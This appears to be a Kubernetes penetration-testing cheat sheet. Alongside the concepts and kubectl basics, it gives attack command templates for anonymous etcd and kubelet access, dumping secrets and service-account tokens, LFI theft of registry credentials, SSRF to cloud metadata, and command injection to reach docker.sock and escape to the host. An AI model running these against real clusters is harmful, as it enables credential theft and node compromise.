## Kubernetes

### **Concepts**

* Kubernetes is a security orchestrator
* Kubernetes master provides an API to interact with nodes
* Each Kubernetes node run kubelet to interact with API and kube-proxy to refect Kubernetes networking services on each node.
* Kubernetes objects are abstractions of states of your system.
  * Pods: collection of container share a network and namespace in the same node.
  * Services: Group of pods running in the cluster.
  * Volumes: directory accesible to all containers in a pod. Solves the problem of loose info when container crash and restart.
  * Namespaces: scope of Kubernetes objects, like a workspace \(dev-space\).

### **Commands**

```text
# kubectl cli for run commands against Kubernetes clusters
# Get info
kubectl cluster-info
# Get other objects info
kubectl get nodes
kubectl get pods
kubectl get services
# Deploy
kubectl run nginxdeployment --image=nginx:alpine
# Port forward to local machine
kubectl port-forward <PODNAME> 1234:80
# Deleting things
kubectl delete pod
# Shell in pod
kubectl exec -it <PODNAME> sh
# Check pod log
kubectl logs <PODNAME>
# List API resources
kubectl api-resources
# Check permissions
kubectl auth can-i create pods
# Get secrets
kubectl get secrets <SECRETNAME> -o yaml
# Get more info of specific pod
kubectl describe pod <PODNAME>
# Get cluster info
kubectl cluster-info dump

# Known vulns
CVE-2016-9962
CVE-2018-1002105
CVE-2019-5736
CVE-2019-9901
```

### External Recon

```bash
# Find subdomains like k8s.target.tld
# Search for yaml files on GitHub
# Check etcdtcl exposed public 
etcdctl –endpoints=http://<MASTER-IP>:2379 get / –prefix –keys-only
# Check pods info disclosure on http://<external-IP>:10255/pods
```

#### Common open ports

![](../../.gitbook/assets/image%20%2850%29.png)

#### Common endpoints

![](../../.gitbook/assets/image%20%2848%29.png)

### Quick attacks

```bash
# Dump all
for res in $(kubectl api-resources -o name);do kubectl get "${res}" -A -o yaml > ${res}.yaml; done

# Check for anon access
curl -k https://<master_ip>:<port>
etcdctl –endpoints=http://<MASTER-IP>:2379 get / –prefix –keys-only
curl http://<external-IP>:10255/pods

#Dump tokens from inside the pod
kubectl exec -ti <pod> -n <namespace> cat /run/secrets/kubernetes.io/serviceaccount/token

#Dump all tokens from secrets
kubectl get secrets -A -o yaml | grep " token:" | sort | uniq > alltokens.txt

#Standard query for creds dump:
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/<namespace>/secrets/
# This also could works /api/v1/namespaces/kube-system/secrets/
```

### Attack Private Registry misconfiguration

```bash
# Web application deployed vulnerable to lfi
# Read configuration through LFI
cat /root/.docker/config.json
# Download this file to your host and configure in your system
docker login -u _json_key -p "$(cat config.json)" https://gcr.io
# Pull the private registry image to get the backend source code
docker pull gcr.io/training-automation-stuff/backend-source-code:latest
# Inspect and enumerate the image
docker run --rm -it gcr.io/training-automation-stuff/backend-source-code:latest
# Check for secrets inside container
ls -l /var/run/secrets/kubernetes.io/serviceaccount/
# Check environment vars
printenv
```

### Attack Cluster Metadata with SSRF

```bash
# Webapp that check the health of other web applications
# Request to 
curl http://169.254.169.254/computeMetadata/v1/
curl http://169.254.169.254/computeMetadata/v1/instance/attributes/kube-env
```

### Attack escaping pod volume mounts to access node and host

```bash
# Webapp makes ping
# add some listing to find docker.sock
ping whatever;ls -l /custom/docker/
# Once found, download docker client
ping whatever;wget https://download.docker.com/linux/static/stable/x86_64/docker-18.09.1.tgz -O /root/docker-18.09.1.tgz
ping whatever;tar -xvzf /root/docker-18.09.1.tgz -C /root/
ping whatever;/root/docker/docker -H unix:///custom/docker/docker.sock ps
ping whatever;/root/docker/docker -H unix:///custom/docker/docker.sock images
```

### Tools

```bash
# kube-bench - secutity checker
kubectl apply -f kube-bench-node.yaml
kubectl get pods --selector job-name=kube-bench-node
kubectl logs kube-bench-podname

# https://github.com/aquasecurity/kube-hunter
kube-hunter --remote some.node.com

# kubeaudit
./kubeaudit all

# kubeletctl
# https://github.com/cyberark/kubeletctl
kubeletctl scan rce XXXXXXXX

# https://github.com/cdk-team/CDK
cdk evaluate

# Api audit
# https://github.com/averonesis/kubolt
```

